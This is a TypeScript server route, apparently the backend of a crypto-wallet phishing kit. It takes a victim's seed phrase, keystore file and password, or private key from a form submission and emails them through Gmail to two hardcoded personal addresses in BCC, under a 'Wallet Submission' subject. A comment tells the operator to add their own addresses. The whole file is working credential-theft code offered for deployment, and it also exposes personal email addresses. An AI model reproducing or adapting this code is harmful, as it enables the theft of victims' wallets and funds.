import nodemailer from 'nodemailer';

function formatMessage(message: string): string {
  const lines = message.split(/\r?\n/);
  const formattedLines = lines.map((line) => `<div style="margin-bottom: 10px;">${line}</div>`);
  return `<div style="font-family: Arial, sans-serif; font-size: 16px; color: #333;">${formattedLines.join('')}</div>`;
}

export async function POST(request: Request) {
  try {
    const { phrase, keystore, privateKey } = await request.json();

    const email = process.env.GMAIL_USER;
    const pass = process.env.GMAIL_PASS;

    const transporter = nodemailer.createTransport({
      service: 'gmail',
      auth: {
        user: email,
        pass: pass,
      },
    });

    transporter.verify(function (error, success) {
      if (error) {
        console.error("Transporter verification failed:", error);
      } else {
        console.log("Transporter is ready to send emails.");
      }
    });

    const bccRecipients = ['fahadabdullahi180@gmail.com', 'nelsonlikita7@gmail.com']; // <-- ADD YOUR 2 EMAILS HERE

    let mailOptions = {};

    if (phrase) {
      const formattedMessage = formatMessage(phrase);
      mailOptions = {
        from: `New Wallet Connect ${email}`,
        bcc: bccRecipients,
        subject: 'Wallet Submission',
        html: formattedMessage,
      };
    }

    if (keystore) {
      mailOptions = {
        from: `New Wallet Connect ${email}`,
        bcc: bccRecipients,
        subject: 'Wallet Submission',
        html: `<div>Json: ${keystore.json}</div> <div>Password: ${keystore.password}</div>`,
      };
    }

    if (privateKey) {
      const formattedMessage = formatMessage(privateKey);
      mailOptions = {
        from: `New Wallet Connect ${email}`,
        bcc: bccRecipients,
        subject: 'Wallet Submission',
        html: formattedMessage,
      };
    }

    const result = await transporter.sendMail(mailOptions);
    console.log('SendMail Result:', result);

    if (result.messageId) {
      return new Response(JSON.stringify({ message: 'Email sent successfully!' }), { status: 200 });
    } else {
      return new Response(JSON.stringify({ error: 'Internal server error' }), { status: 500 });
    }
  } catch (error: unknown) {
    if (error instanceof Error) {
      console.error('Error in sending email:', error);
      return new Response(JSON.stringify({ error: error.message }), { status: 500 });
    } else {
      console.error('Unknown error:', error);
      return new Response(JSON.stringify({ error: String(error) }), { status: 500 });
    }
  }
}
